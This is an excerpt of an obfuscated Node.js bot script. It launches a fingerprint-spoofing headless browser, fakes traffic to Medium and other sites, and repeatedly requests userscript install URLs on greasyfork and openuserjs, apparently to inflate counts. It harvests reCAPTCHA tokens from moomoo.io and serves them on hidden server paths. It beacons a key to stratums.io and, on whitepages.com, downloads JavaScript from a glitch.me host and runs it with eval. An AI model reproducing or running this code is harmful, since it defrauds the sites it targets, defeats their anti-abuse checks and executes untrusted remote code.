      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + T(0x12, '[cFP') + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    T(0xc, '6RJs') + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + W(0x4),
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + T(0x1, 'L*rw') + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1205 + -0xc2a + 0x1e2f
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2420 + -0x1f3f + 0x435f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * -0xafa + 0xbbf * -0x2 + 0x3b * 0x38), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1c1d + 0x1820 + -0x33d9), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x44 * 0x55 + 0x23f8 + -0x2 * 0x6b2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x22 * 0x25 + -0x7bd + -0x1 * -0x2d3; w < getRandomInt(0x998 * -0x1 + -0x10a9 * -0x2 + -0x17b9, -0x1cfd + 0x239e + -0xbc * 0x9); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x42d5 * -0x5 + -0xd011 + 0x6c48);
        }
      }();
    }, -0x195d + -0x1bca * 0x1 + -0x358b * -0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const X = b;
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })[X(0x7, 'xix7')](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xfe0 + 0x5 * 0x143 + 0x162f * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x17d1 * 0x1 + 0x1a32 + 0x3203 * -0x1, -0x81 * 0xb + 0x209f * 0x1 + -0x1ae2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          const Y = b;
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + Y(0x11, 'bU6Q'), {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xb93b * -0x1 + 0x1 * 0xc4cf + 0x699c);
    }, -0x5a7 + -0xc1d + 0x245 * 0x8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1e6 + -0x6d0 + 0x4ea;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x6ec * -0x3 + -0x111b + 0x3197), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x6d * 0x1 + 0x3d6 * -0x1 + 0x369), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x54172 + 0xb7ad9 + 0x78239);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x19d0 + -0xed2 + -0xa9a);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xbf * 0x21 + -0x195b + -0x184 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x5 * -0xc41 + -0x2611 + -0x1e * -0x45d);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = b;
  async function f() {
    const a0 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x5d * 0x3 + 0xa01 + -0x8e9) {
        const Z = b;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1e80 * 0x1 + 0x1ff6 + -0x3e75));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D[Z(0x3, 'bU6Q')](-0xbbe + -0x45a + 0x1018, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1a88 + -0x1 * 0x10be + 0x2b46, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xf1 * 0x47 + -0x26a2 * -0x1 + -0x4269),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': a0(0x17, '6I#S') + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1e2 * 0x16 + -0x276b + 0x77e7),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + a0(0xf, 'O*0!'),
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a1(0x16, '25OF') + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0xb * -0x14 + 0x1440 + -0x1364; k < 0x187 + 0x1bd7 + -0x1d5a; k++)
    setTimeout(f, (0x1 * -0xc90d + -0x17 * 0x137b + 0x3737a) * k * getRandomInt(-0x1aae + -0x1e3a + 0x38e9, 0x1830 + -0x199d + 0x170));
  setInterval(() => {
    f();
    for (let l = -0x20d0 + 0x817 * -0x1 + 0x28e7; l < 0xf1d * -0x2 + -0x19aa + 0x37e8; l++)
      setTimeout(f, (0xc3a6 + -0x7151 * 0x4 + 0x1ebfe) * l * getRandomInt(0xf1 * -0x14 + 0xe * -0x9d + 0x1b6b, -0x1 * -0x13b5 + -0x1 * -0xb35 + 0xa4d * -0x3));
  }, -0x1b6746 + -0x4523a2 + 0x977968);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
